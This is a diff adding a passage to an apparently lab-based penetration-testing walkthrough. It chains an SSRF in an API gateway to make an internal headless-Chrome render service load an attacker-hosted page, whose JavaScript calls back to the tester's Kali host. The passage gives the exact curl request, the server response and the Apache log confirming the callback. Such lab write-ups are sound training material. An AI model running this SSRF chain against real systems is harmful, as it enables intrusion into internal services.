@@ -541,3 +541,38 @@ function runscript() {
 </body>
 </html>
 ```
+Since the application does not return the page loaded with the SSRF vulnerability, we need another way to determine if the browser executes JavaScript. Our JavaScript function uses `fetch()` to make a call back to our Kali host. The `onload` event in the body tag calls our function. After placing this file in our webroot, let's use the SSRF vulnerability to call the render service pointed at this file.
+
+let's use the SSRF vulnerability to call the render service pointed at this file.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://172.16.16.5:9000/api/render?url=http://192.168.45.203/hello.html"}' http://apigateway:8000/files/import
+HTTP/1.1 403 Forbidden
+Content-Type: application/json; charset=utf-8
+Content-Length: 102
+Connection: keep-alive
+X-Powered-By: Directus
+Vary: Origin
+Access-Control-Allow-Credentials: true
+Access-Control-Expose-Headers: Content-Range
+ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
+Date: Tue, 29 Jul 2025 16:22:32 GMT
+X-Kong-Upstream-Latency: 1402
+X-Kong-Proxy-Latency: 1
+Via: kong/2.2.1
+
+{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
+┌──(kali㉿kali)-[~]
+└─$
+```
+Since we received a "forbidden" response, the browser should have loaded our HTML page. Let's check our Apache access log for the callback.
+
+```bash
+┌──(kali㉿kali)-[/var/www/html]
+└─$ tail -f /var/log/apache2/access.log
+192.168.217.135 - - [29/Jul/2025:11:55:23 -0400] "GET /render/url HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.217.135 - - [29/Jul/2025:12:22:31 -0400] "GET /hello.html HTTP/1.1" 200 484 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+192.168.217.135 - - [29/Jul/2025:12:22:31 -0400] "GET /itworked HTTP/1.1" 404 492 "http://192.168.45.203/hello.html" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36"
+
+
+```
